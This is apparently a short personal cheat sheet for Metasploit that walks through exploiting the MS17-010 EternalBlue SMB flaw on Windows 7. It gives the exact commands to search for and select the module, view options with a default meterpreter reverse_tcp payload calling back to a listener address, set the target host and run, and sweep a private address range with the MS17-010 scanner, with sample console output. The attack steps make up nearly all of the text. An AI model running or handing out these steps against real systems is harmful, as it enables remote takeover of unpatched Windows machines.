# Start 
```
msfconsole
```

# `search` For module/ Vulnerability available
```
search <Vulnerability>
```

Example:
```
search ms17_010
```
This will give a list of `ethernal blue` with the target available 

# `use` The vulnerability
```
use <value>
```
Example when want to use `ethernal blue` target a windows 7:

What u get in search:
```
msf > search ms17_010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   Yes    MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
```

To use it execute:
```
use 2
```

# `set` The target and `run`
After selecting what vulnarability to use, set the target in options
```
options
```
Output:
```
msf > use 2
[*] Additionally setting TARGET => Windows 7
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.0.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows 7
```
What we need is the RHOSTS

DO:

```
set RHOSTS <target ip>
run
```

if not sure which port can be attack, `use 24` (`auxiliary/scanner/smb/smb_ms17_010`) to scan the port
```
set rhosts <ip range>
run
```

Example:
```
msf auxiliary(scanner/smb/smb_ms17_010) > set rhosts 172.16.0.0-172.16.0.100
rhosts => 172.16.0.0-172.16.0.100
msf auxiliary(scanner/smb/smb_ms17_010) > run
[-] 172.16.0.0:445        - Rex::ConnectionTimeout: The connection with (172.16.0.0:445) timed out.
[-] 172.16.0.1:445        - Rex::ConnectionTimeout: The connection with (172.16.0.1:445) timed out.
[-] 172.16.0.2:445        - Rex::ConnectionRefused: The connection was refused by the remote host (172.16.0.2:445).
[-] 172.16.0.3:445        - Rex::ConnectionTimeout: The connection with (172.16.0.3:445) timed out.
[-] 172.16.0.4:445        - Rex::ConnectionTimeout: The connection with (172.16.0.4:445) timed out.
[-] 172.16.0.5:445        - Rex::ConnectionTimeout: The connection with (172.16.0.5:445) timed out.
[-] 172.16.0.6:445        - Rex::ConnectionTimeout: The connection with (172.16.0.6:445) timed out.
[-] 172.16.0.7:445        - Rex::ConnectionTimeout: The connection with (172.16.0.7:445) timed out.
[-] 172.16.0.8:445        - Rex::ConnectionTimeout: The connection with (172.16.0.8:445) timed out.
[-] 172.16.0.9:445        - Rex::ConnectionTimeout: The connection with (172.16.0.9:445) timed out.
[-] 172.16.0.10:445       - Rex::ConnectionTimeout: The connection with (172.16.0.10:445) timed out.
[*] Scanned  11 of 101 hosts (10% complete)
[-] 172.16.0.11:445       - Rex::ConnectionTimeout: The connection with (172.16.0.11:445) timed out.
[-] 172.16.0.12:445       - Rex::ConnectionTimeout: The connection with (172.16.0.12:445) timed out.
```

if [+] apears means the port is vulnarable to this type of attack
